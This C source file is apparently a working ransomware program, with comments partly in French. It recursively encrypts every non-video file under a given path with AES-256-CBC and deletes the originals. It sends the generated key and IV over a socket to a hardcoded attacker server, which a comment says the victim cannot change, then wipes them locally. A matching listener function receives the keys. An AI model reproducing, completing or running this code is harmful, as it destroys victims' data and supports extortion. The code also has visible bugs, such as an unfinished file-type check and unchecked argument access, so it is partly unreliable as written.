#include <dirent.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/stat.h>
// librairies for encryption
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
// librairies for sockets
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
char *server_ip = "127.0.0.1";// IP is hardcoded, victim can't change it -> alternative is to use a Domain Name


void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, char * mode);
bool doUseFile(const char *filename);
void handleErrors(void);
int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv, unsigned char *plaintext);
int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext);
int encryptFile(char *filename, unsigned char *key, unsigned char *iv);
int decryptFile(char *filename, unsigned char *key, unsigned char *iv);
int sendKey(unsigned char *key, unsigned char *iv);

int main(int argc, char* argv[]){
    
    unsigned char key[32];
    unsigned char iv[16];

    // if mode is -e, generate key and iv and send it to the remote server
    if(strcmp(argv[2],"-e") == 0){

        RAND_priv_bytes(key, 32);
        RAND_priv_bytes(iv, 16);

        sendKey(key,iv);
        // erase key from memory -> fills the memory with 0's
        memset(key, 0, sizeof(key));
        memset(iv, 0, sizeof(iv));
    }
    // if mode is -d, read key and iv from files
    else if(strcmp(argv[2],"-d") == 0){
        FILE *key_file = fopen("key.bin", "rb");
        FILE *iv_file = fopen("iv.bin", "rb");

        fread(key, 1, 32, key_file);
        fread(iv, 1, 16, iv_file);

        fclose(key_file);
        fclose(iv_file);
    }
    else{
        puts("ERROR: invalid mode");
        return 0;
    }

    // argv[2] -> -e = encrypt, -d = decrypt
    if(argc == 3){ //argv[0] = program name, argv[1] = path, argv[2] = mode > argc = 3 -> the arguments are interpreted in the dirContent function
        dirContent(argv[1],key,iv,argv[2]);
    }
    else{

        if(argc > 3){
            puts("ERROR: too many arguments");
            return 0;
        }

        else {
            puts("ERROR: too few arguments");
            return 0;
        }
    }

    return 0;
}


void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, char * mode){
    DIR *d = opendir(rootpath);

    if (d == NULL){
        perror("ERROR: ");
    }
    struct dirent *sd = readdir(d);



    while (sd!= NULL){

        if(sd -> d_type == DT_DIR && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ // verify if the  sd is a directory, and ignore . and .. who are the current or parent directory
            char* new_path = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2); // we allocate memory for the new path with the size of the rootpath + the size of the name of the directory + 2 for the / and the \0 
            strcpy(new_path,""); // clean memory of the variable
            strncat(new_path,rootpath,strlen(rootpath));
            strcat(new_path,"/");
            strncat(new_path,sd ->d_name,strlen(sd->d_name));

            dirContent(new_path,key,iv,mode);
            free(new_path);
        }

        else{
            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ //verify if the file is a regular file and not the current or parent directory
                char* filepath = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2);
                strcpy(filepath,""); // clean memory of the variable
                strncat(filepath,rootpath,strlen(rootpath));
                strcat(filepath,"/");
                strncat(filepath,sd ->d_name,strlen(sd->d_name));

                if(doUseFile(sd -> d_name) == true){
                
                    printf("Nom du fichier: %s\n",sd->d_name);
                
                    if(strcmp(mode,"-e") == 0){
                        encryptFile(filepath,key,iv);
                    }
                    else if(strcmp(mode,"-d") == 0 && strstr(filepath,".enc") != NULL){
                        decryptFile(filepath,key,iv);
                    }


                }
                else{
                    printf("Fichier ignoré:%s\n",sd->d_name);
                }
            free(filepath);
            }
        }
       sd = readdir(d);
    }
}

bool doUseFile(const char *filename){
// if file is a video, return false
    if(strstr(filename,".mp4") != NULL || strstr(filename,".avi") != NULL || strstr(filename,".mkv") != NULL || strstr(filename,".mov") != NULL || strstr(filename,".flv") != NULL || strstr(filename,".wmv") != NULL || strstr(filename,".mpg") != NULL || strstr(filename,".m4v") != NULL || strstr(filename,".webm") {
        return false;
    }
    else{ 
        return true;
        
    }


}

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}


int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;


}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;

}

int encryptFile(char *filename, unsigned char *key, unsigned char *iv){
    printf("Encrypting file %s\n",filename);
    char *filepath_enc = malloc(strlen(filename) + 5);
    strcpy(filepath_enc, filename);
    strcat(filepath_enc, ".enc");


    FILE *toEncrypt = fopen(filename, "r");
    FILE *fileEncrypted = fopen(filepath_enc, "w");
    unsigned char *plaintext = malloc(1024);
    unsigned char *ciphertext = malloc(1040);
    int plaintext_len = 1024;
    while(plaintext_len == 1024){
        plaintext_len = fread(plaintext, 1, 1024, toEncrypt);
        int ciphertext_len = encrypt(plaintext, plaintext_len, key, iv, ciphertext);
        fwrite(ciphertext, 1, ciphertext_len, fileEncrypted);
        
    }
    // delete original file
    remove(filename);
    //close everything
    fclose(toEncrypt);
    fclose(fileEncrypted);
    free(plaintext);
    free(ciphertext);
}
int decryptFile(char *filename, unsigned char *key, unsigned char *iv){
    printf("Decrypting file %s\n",filename);
    char *filename_dec = malloc(strlen(filename) - 4);
    strncpy(filename_dec, filename, strlen(filename) - 4);
    filename_dec[strlen(filename) - 4] = '\0';
    FILE *toDecrypt = fopen(filename, "r");
    FILE *fileDecrypted = fopen(filename_dec, "w");

    unsigned char *decryptedtext = malloc(1024);
    unsigned char *ciphertext2 = malloc(1040);
    int decryptedtext_len = 0;
    int ciphertext_len2 = 1040;
    while(ciphertext_len2 == 1040){
        ciphertext_len2 = fread(ciphertext2, 1, 1040, toDecrypt);
        decryptedtext_len = decrypt(ciphertext2, ciphertext_len2, key, iv, decryptedtext);
        fwrite(decryptedtext, 1, decryptedtext_len, fileDecrypted);
        
        
    }
    // delete .enc file
    remove(filename);
    //close everything
    fclose(toDecrypt);
    fclose(fileDecrypted);
    free(decryptedtext);
    free(ciphertext2);
    free(filename_dec);

}

int sendKey(unsigned char *key, unsigned char *iv){
    // create a socket
    int sockid = socket(AF_INET, SOCK_STREAM, 0);
    int server_port= 9999;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(9999);
    inet_aton(server_ip, &server_addr.sin_addr);
    // connect to server
    connect(sockid, (struct sockaddr*)&server_addr, sizeof(server_addr));


    // send the key and iv to the server
    send(sockid, key, 32, 0);
    send(sockid, iv, 16, 0);


    return 0;
}

int getKey(){
        // create a socket
    int sockid = socket(AF_INET, SOCK_STREAM, 0);
    int server_port= 9998;


    sockid= socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    char *buffer[BUFFER_SIZE];
    int n, len, client_socket;

    int bind_result = bind(sockid, (struct sockaddr*)&server_addr, sizeof(server_addr));

    if(bind_result < 0){
        perror("Bind error");
        exit(1);
    }
    else{
        printf("server is listening on port %s:%d\n", server_ip,server_port);
        n = listen(sockid, 1);

        len = sizeof(client_addr);
        client_socket = accept(sockid, (struct sockaddr*)&client_addr, &len);

        printf("accepted connection from %d %s:%d\n",
            client_socket,
            inet_ntoa(client_addr.sin_addr),
            ntohs(client_addr.sin_port));
        
        // receive key and iv from client and store it in binary files
        n = recv(client_socket,(char *)buffer, BUFFER_SIZE, 0);
        FILE *key_file = fopen("key.bin", "wb");
        fwrite(buffer, 1, n, key_file);
        fclose(key_file);

        n = recv(client_socket,(char *)buffer, BUFFER_SIZE, 0);
        FILE *iv_file = fopen("iv.bin", "wb");
        fwrite(buffer, 1, n, iv_file);
        fclose(iv_file);
    }
}   